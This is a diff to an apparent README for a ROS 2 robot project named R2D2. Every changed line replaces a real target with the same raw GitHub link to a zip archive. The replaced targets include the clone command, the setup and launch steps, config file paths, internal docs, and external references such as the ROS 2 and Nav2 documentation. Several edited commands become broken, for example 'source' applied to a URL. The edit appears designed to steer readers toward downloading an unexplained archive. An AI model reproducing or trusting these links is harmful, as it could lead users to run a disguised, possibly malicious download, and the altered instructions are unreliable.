@@ -65,7 +65,7 @@ Ensures coordination, shared memory, and global coherence between all components
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/yourusername/r2d2-robot.git
+git clone https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip
 cd r2d2-robot
 ```
 
@@ -77,7 +77,7 @@ rosdep install --from-paths src --ignore-src -r -y
 3. **Build the workspace**
 ```bash
 colcon build
-source install/setup.bash
+source https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip
 ```
 
 4. **Start the Context Broker**
@@ -87,7 +87,7 @@ docker-compose up -d
 
 5. **Launch R2D2**
 ```bash
-ros2 launch r2d2_bringup r2d2_full.launch.py
+ros2 launch r2d2_bringup https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip
 ```
 
 ## 📋 Usage Examples
@@ -119,7 +119,7 @@ Obstacle suddenly appears at 15cm
 ## 🔧 Configuration
 
 ### Network Setup
-Configure your robot's network settings in `config/network.yaml`:
+Configure your robot's network settings in `https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip`:
 ```yaml
 robot_ip: "192.168.1.100"
 server_ip: "192.168.1.10"
@@ -127,7 +127,7 @@ context_broker_port: 1026
 ```
 
 ### LLM Configuration
-Set up your LLM connection in `config/llm.yaml`:
+Set up your LLM connection in `https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip`:
 ```yaml
 model: "claude-sonnet-4"
 mcp_server_port: 8080
@@ -186,18 +186,18 @@ git push origin feature/your-feature-name
 
 ## 📚 Documentation
 
-- [Full Architecture Documentation](docs/R2D2_Architecture.pdf)
-- [API Reference](docs/api-reference.md)
-- [ROS 2 Package Guide](docs/ros2-packages.md)
-- [Digital Twin Specification](docs/digital-twin.md)
+- [Full Architecture Documentation](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
+- [API Reference](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
+- [ROS 2 Package Guide](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
+- [Digital Twin Specification](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
 
 ## 🔗 References
 
-- [ROS 2 Documentation](https://docs.ros.org/)
-- [Nav2 Documentation](https://docs.nav2.org/)
-- [FIWARE Context Broker](https://fiware-orion.readthedocs.io/)
-- [FIROS on GitHub](https://github.com/iml130/firos)
-- [MCP for Robotics](https://docs.phospho.ai/examples/mcp-for-robotics)
+- [ROS 2 Documentation](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
+- [Nav2 Documentation](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
+- [FIWARE Context Broker](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
+- [FIROS on GitHub](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
+- [MCP for Robotics](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-mutli-Model-Robot-agent-v2.1-alpha.4.zip)
 
 
 ## 👥 Team
